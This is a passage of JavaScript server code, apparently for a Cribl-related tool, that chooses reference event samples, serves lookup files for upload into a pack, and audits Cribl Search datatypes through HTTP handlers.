  // Pick the sample with the most events.
  const best = [...merged.samples].sort((a, b) => (b.events || 0) - (a.events || 0))[0];
  if (!best?.file) {
    return await resolveFallbackSample(fbKey, format);
  }
  const samplePath = join(SAMPLE_LIB, best.file);
  if (!existsSync(samplePath)) {
    return await resolveFallbackSample(fbKey, format);
  }
  const events = JSON.parse(readFileSync(samplePath, 'utf-8'));
  const evtList = Array.isArray(events) ? events : [events];
  const st = fbKey;
  if (evtList.length < 3) {
    // A catalog sample this thin is worse than a fallback, but only swap if a
    // fallback actually exists — otherwise keep the 1-2 events we have.
    const thin = await resolveFallbackSample(st, format);
    if (thin.available) return thin;
  }
  return {
    available: true,
    events: evtList,
    sourcetype: st,
    pack: merged.pack,
    fields: merged.fields,
    sampleName: best.name,
  };
}

export async function handleReferenceSample(req, res) {
  try {
    const { sourcetype, format } = getQuery(req);
    sendJson(res, await resolveReferenceSample(sourcetype, format));
  } catch (e) {
    sendJson(res, { error: e.message }, 500);
  }
}

// Return the golden lookup files (WITH content) that apply to a sourcetype, so
// the deploy path (iframe OR standalone) can upload them into the pack. The
// browser can't read the filesystem, so it fetches the content from here then
// POSTs it to the Cribl lookups API itself.
export function handleReferenceLookups(req, res) {
  try {
    const { sourcetype } = getQuery(req);
    const lookups = getLookupsForSourcetype(sourcetype);
    sendJson(res, { lookups: lookups.map(l => ({ file: l.file, content: l.content, description: l.description, rows: l.rows })) });
  } catch (e) {
    sendJson(res, { error: e.message }, 500);
  }
}

// Datatype audit: compare live Cribl Search datatypes vs. what the app has
// imported/exposes. GET = report only; POST = import NEW parsers (--apply).
export async function handleDatatypeAudit(req, res) {
  try {
    const apply = req.method === 'POST';
    const { group } = getQuery(req);
    const report = await auditDatatypes(group || 'default_search', { apply });
    sendJson(res, report);
  } catch (e) {
    sendJson(res, { error: e.message }, 500);
  }
}
